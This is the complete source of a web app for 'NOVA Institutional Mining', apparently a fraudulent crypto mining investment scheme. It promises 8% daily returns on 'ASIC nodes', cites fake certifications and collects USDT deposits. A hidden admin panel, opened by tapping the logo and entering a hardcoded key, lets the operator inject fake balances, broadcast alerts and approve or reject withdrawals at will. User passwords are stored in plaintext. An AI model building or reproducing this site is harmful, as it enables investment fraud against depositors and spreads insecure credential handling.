<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Professional Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --n-gold: #D4AF37; --n-bg: #F8FAFC; }
        body { background: var(--n-bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; }
        .nova-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.03); }
        .node-gradient { background: linear-gradient(135deg, #1e293b 0%, #334155 100%); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 12px; font-weight: 700; transition: 0.2s; text-transform: uppercase; font-size: 11px; }
        .btn-gold:active { transform: scale(0.96); }
        .screen { display: none; padding-bottom: 110px; animation: fadeIn 0.3s ease-in; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px 5px; z-index: 100; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: #B8860B; }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 14px; border-radius: 12px; outline: none; margin-bottom: 10px; font-size: 13px; }
        .p-input:focus { border-color: #D4AF37; background: #fff; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 1000; padding: 20px; overflow-y: auto; }
        .badge-pending { background: #fff7ed; color: #ea580c; border: 1px solid #fed7aa; }
        .badge-success { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    </style>
</head>
<body>

    <div id="global-msg" class="hidden bg-slate-900 text-[#D4AF37] p-2.5 text-[10px] font-bold text-center uppercase tracking-widest border-b border-yellow-600/20"></div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="mb-10 text-center">
            <h1 onclick="handleTaps()" class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[5px] mt-2">Institutional Mining Core</p>
        </div>
        <div class="space-y-2">
            <input type="text" id="u-id" placeholder="Access ID / Account" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <input type="text" id="adm-key" placeholder="System Master Access" class="hidden p-input border-yellow-500">
            <button onclick="auth()" class="w-full btn-gold py-4 shadow-lg shadow-yellow-600/10">Initialize Session</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-slate-400 font-bold uppercase cursor-pointer">Deploy New Node (Register)</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white sticky top-0 z-50 border-b">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <a id="tg-link" href="#" target="_blank" class="text-sky-500 text-xl"><i class="fa-brands fa-telegram"></i></a>
                <i onclick="logout()" class="fa-solid fa-power-off text-slate-300"></i>
            </div>
        </header>

        <div id="dash-screen" class="screen active-screen px-4 pt-4">
            <div class="nova-card p-8 mb-4 bg-slate-900 text-center text-white relative overflow-hidden">
                <p class="text-[9px] text-slate-400 font-bold uppercase tracking-widest mb-2">Total Assets</p>
                <h1 id="main-bal" class="text-5xl font-extrabold text-[#D4AF37]">$0.00</h1>
                <p id="v-daily" class="text-[10px] font-bold text-green-400 mt-4 uppercase">Node Yield: +$0.00 / 24H</p>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-4">
                <button onclick="openModal('dep-modal')" class="nova-card p-5 flex flex-col items-center gap-2"><i class="fa-solid fa-circle-plus text-[#D4AF37] text-xl"></i><span class="text-[10px] font-black uppercase">Deposit</span></button>
                <button onclick="openModal('wd-modal')" class="nova-card p-5 flex flex-col items-center gap-2"><i class="fa-solid fa-wallet text-slate-400 text-xl"></i><span class="text-[10px] font-black uppercase">Withdraw</span></button>
            </div>

            <div class="nova-card p-5 mb-4 flex justify-between items-center">
                <div><p class="text-[9px] font-black text-slate-400 uppercase">Voucher Claim</p><p class="text-xs font-bold">$0.10 - $0.50 Daily</p></div>
                <button id="bonus-btn" onclick="claimBonus()" class="btn-gold px-6 py-2.5">Claim</button>
            </div>

            <div class="nova-card p-5 mb-4">
                <div class="flex gap-2">
                    <input type="text" id="promo-inp" placeholder="PROMO CODE" class="p-input mb-0 py-2.5 text-[11px] font-bold">
                    <button onclick="applyPromo()" class="btn-gold px-6">Apply</button>
                </div>
            </div>

            <div id="about-section" class="nova-card p-6 bg-slate-50 border-dashed border-2 border-slate-200">
                <h3 class="text-xs font-black uppercase mb-3 flex items-center gap-2"><i class="fa-solid fa-building-shield text-[#D4AF37]"></i> Corporate Identity</h3>
                <p class="text-[10px] text-slate-500 leading-relaxed font-medium">
                    NOVA Institutional Mining is a globally certified ASIC infrastructure provider. Established in 2021, we operate high-density hash clusters across Northern Europe. 
                    <br><br>
                    Registration: #UK-09921820 | Certified by Global Hash Council.
                </p>
            </div>
        </div>

        <div id="mine-screen" class="screen px-4 pt-4">
            <h2 class="text-xl font-black mb-5 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Nodes</span></h2>
            <div id="nodes-container" class="space-y-4"></div>
        </div>

        <div id="hist-screen" class="screen px-4 pt-4">
            <h2 class="text-xl font-black mb-5 uppercase tracking-tighter">Audit <span class="text-[#D4AF37]">History</span></h2>
            <div id="hist-container" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-microchip text-lg"></i><span>DASH</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-server text-lg"></i><span>NODES</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-receipt text-lg"></i><span>AUDIT</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-black uppercase">Liquidity</h2>
            <i onclick="closeModal('dep-modal')" class="fa-solid fa-circle-xmark text-slate-300 text-xl"></i>
        </div>
        <div class="grid grid-cols-2 gap-3 mb-6">
            <div onclick="selD('Binance Pay')" class="dep-m nova-card p-3 text-center border-2 border-slate-100" id="m-bin"><i class="fa-solid fa-coins text-yellow-500 mb-1"></i><p class="text-[9px] font-bold">Binance</p></div>
            <div onclick="selD('Trust Wallet')" class="dep-m nova-card p-3 text-center border-2 border-slate-100"><i class="fa-solid fa-shield text-blue-500 mb-1"></i><p class="text-[9px] font-bold">Trust</p></div>
            <div onclick="selD('MetaMask')" class="dep-m nova-card p-3 text-center border-2 border-slate-100"><i class="fa-solid fa-fox text-orange-500 mb-1"></i><p class="text-[9px] font-bold">MetaMask</p></div>
            <div onclick="selD('Violet')" class="dep-m nova-card p-3 text-center border-2 border-slate-100"><i class="fa-solid fa-wallet text-purple-500 mb-1"></i><p class="text-[9px] font-bold">Violet</p></div>
        </div>
        <div class="nova-card p-4 bg-slate-900 text-white mb-6 text-center">
            <p class="text-[8px] text-slate-400 font-bold uppercase mb-1">Official USDT (TRC20)</p>
            <p id="dep-addr" class="text-[10px] font-mono break-all font-bold text-[#D4AF37]">T-NETWORK-WAITING-FOR-ADMIN</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="p-input">
        <button onclick="reqFin('Deposit')" class="w-full btn-gold py-4 mt-2">Initialize Funding</button>
    </div>

    <div id="wd-modal" class="modal">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-black uppercase">Extract</h2>
            <i onclick="closeModal('wd-modal')" class="fa-solid fa-circle-xmark text-slate-300 text-xl"></i>
        </div>
        <select id="wd-method" class="p-input font-bold">
            <option>Binance Pay</option>
            <option>EasyPaisa</option>
            <option>Trust Wallet</option>
            <option>MetaMask</option>
        </select>
        <input type="number" id="wd-amt" placeholder="Amount to Extract ($)" class="p-input">
        <input type="text" id="wd-acc" placeholder="Recipient Address / Wallet" class="p-input">
        <button onclick="reqFin('Withdrawal')" class="w-full btn-gold py-4 bg-slate-900">Request Withdrawal</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 pb-4 border-b">
            <h2 class="font-black text-xs uppercase tracking-widest">Admin Command Center</h2>
            <button onclick="location.reload()" class="text-red-500 font-bold text-[10px]">RELOAD</button>
        </div>
        <div class="space-y-6">
            <div class="nova-card p-5 bg-slate-50">
                <h3 class="text-[10px] font-black mb-3">GLOBAL BROADCAST</h3>
                <input type="text" id="adm-msg" placeholder="System Alert Message" class="p-input text-xs">
                <button onclick="sendGlobal()" class="w-full btn-gold py-3">Send Broadcast</button>
            </div>
            <div class="nova-card p-5 bg-slate-50">
                <h3 class="text-[10px] font-black mb-3">BALANCE INJECTION</h3>
                <input type="text" id="adm-uid" placeholder="User ID" class="p-input text-xs">
                <input type="number" id="adm-amt" placeholder="Amount to Inject" class="p-input text-xs">
                <button onclick="injectBal()" class="w-full btn-gold py-3">Update User</button>
            </div>
            <div>
                <h3 class="text-[10px] font-black mb-4">PENDING TRANSACTIONS</h3>
                <div id="adm-requests" class="space-y-4"></div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // CONFIG (Same as before)
        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let login = true; let currentM = "Binance Pay";

        if(user) start(user);

        window.auth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "admin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Credentials Missing");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!login) {
                if(s.exists()) return alert("Identity Exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, bonusUsed: false, promoUsed: false });
                localStorage.setItem('nova_user', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Access Error");
        };

        function start(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Node Yield: +$" + (data.daily || 0).toFixed(2) + " / 24H";
                if(data.bonusUsed) { document.getElementById('bonus-btn').disabled = true; document.getElementById('bonus-btn').innerText = "Claimed"; }
            });
            onSnapshot(doc(db, "settings", "global"), d => {
                if(d.exists() && d.data().msg) { document.getElementById('global-msg').innerText = d.data().msg; document.getElementById('global-msg').classList.remove('hidden'); }
            });
            loadNodes(); loadHistory();
        }

        function loadNodes() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            for(let i=1; i<=20; i++) {
                let p = i === 1 ? 20 : (i === 20 ? 20000 : i * 1000); 
                let d = (p * 0.08).toFixed(2);
                c.innerHTML += `<div class="nova-card overflow-hidden">
                    <div class="node-gradient h-20 flex items-center justify-center"><i class="fa-solid fa-microchip text-white/20 text-4xl"></i></div>
                    <div class="p-5 flex justify-between items-center">
                        <div><h4 class="text-xs font-black uppercase">NOVA ASIC v.${i}</h4><p class="text-[9px] font-bold text-green-500">Yield: +$${d}/Day</p></div>
                        <div class="text-right"><p class="text-sm font-black mb-1">$${p}</p><button onclick="buyNode(${p},${d})" class="btn-gold px-4 py-2">Deploy</button></div>
                    </div>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Low Liquidity");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Mining Session Started!");
        };

        window.selD = (m) => { currentM = m; document.querySelectorAll('.dep-m').forEach(e => e.style.borderColor = "#f1f5f9"); event.currentTarget.style.borderColor = "#D4AF37"; };

        window.reqFin = async (type) => {
            const amt = parseFloat(document.getElementById(type=='Deposit'?'dep-amt':'wd-amt').value);
            const ref = document.getElementById(type=='Deposit'?'dep-tid':'wd-acc').value;
            if(!amt || !ref) return alert("Fill all fields");
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(type === 'Withdrawal' && s.data().balance < amt) return alert("Insufficient Balance");
            if(type === 'Withdrawal') await updateDoc(uR, { balance: s.data().balance - amt });
            await addDoc(collection(db, "logs"), { user, type, amount: amt, status: 'Pending', time: Date.now(), method: type=='Deposit'?currentM:document.getElementById('wd-method').value, ref });
            alert("Protocol Submitted!"); closeModal(type=='Deposit'?'dep-modal':'wd-modal');
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user), orderBy("time", "desc")), s => {
                const c = document.getElementById('hist-container'); c.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between items-center">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase">${r.type} (${r.method})</p><p class="text-xs font-bold">$${r.amount}</p></div>
                        <span class="text-[9px] font-bold px-3 py-1 rounded-full ${r.status=='Success'?'badge-success':'badge-pending'}">${r.status}</span>
                    </div>`;
                });
            });
        }

        window.loadAdmin = () => {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const c = document.getElementById('adm-requests'); c.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    c.innerHTML += `<div class="nova-card p-5 bg-white border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <div class="mb-3"><p class="text-[10px] font-black">${r.user} - $${r.amount}</p><p class="text-[8px] text-slate-400 uppercase">${r.type} | ${r.method}</p><p class="text-[8px] font-mono mt-1">${r.ref}</p></div>
                        <div class="flex gap-2">
                            <button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Success')" class="flex-1 bg-green-500 text-white text-[8px] font-bold py-2.5 rounded-lg">APPROVE</button>
                            <button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Rejected')" class="flex-1 bg-red-500 text-white text-[8px] font-bold py-2.5 rounded-lg">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        };

        window.admAct = async (id, u, a, t, s) => {
            if(s === 'Success' && t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            if(s === 'Rejected' && t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: s });
        };

        window.claimBonus = async () => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().bonusUsed) return;
            const b = (Math.random() * 0.4 + 0.1).toFixed(2);
            await updateDoc(uR, { balance: s.data().balance + parseFloat(b), bonusUsed: true });
            alert("Bonus Claimed: $" + b);
        };

        window.sendGlobal = async () => { await setDoc(doc(db, "settings", "global"), { msg: document.getElementById('adm-msg').value }); alert("Broadcast Live!"); };
        window.injectBal = async () => { const uR = doc(db, "users", document.getElementById('adm-uid').value.toLowerCase().trim()); const s = await getDoc(uR); if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + parseFloat(document.getElementById('adm-amt').value) }); alert("Balance Updated!"); } };
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { login = !login; document.getElementById('m-text').innerText = login ? "Deploy New Node (Register)" : "Return to Security Access"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
